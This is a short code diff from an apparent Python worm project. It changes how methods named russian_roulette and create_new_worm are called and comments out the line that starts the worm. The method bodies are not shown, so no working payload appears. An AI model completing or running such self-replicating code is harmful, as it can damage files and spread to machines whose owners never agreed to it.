@@ -208,10 +208,8 @@ class Worm:
         self.list_directories(self.path)
         
         try:
-            self.threader.append(self.russian_roulette())
-            self.threader.append(self.create_new_worm())
-            self.threader.start()
-            self.threader.join()     
+            self.russian_roulette()
+            self.create_new_worm()  
         except:
             logging.warning("something went wrong")
         
@@ -226,8 +224,8 @@ class Worm:
 if __name__=="__main__":
     current_directory = os.path.abspath("")
     worm = Worm(path=current_directory)
-    worm.start_worm_actions()
-    with open('log.txt', 'w') as f:
-        f.write(f"{perf_counter() - worm.start:.5f}")
+    # worm.start_worm_actions()
+    # with open('log.txt', 'w') as f:
+    #     f.write(f"{perf_counter() - worm.start:.5f}")
     
     
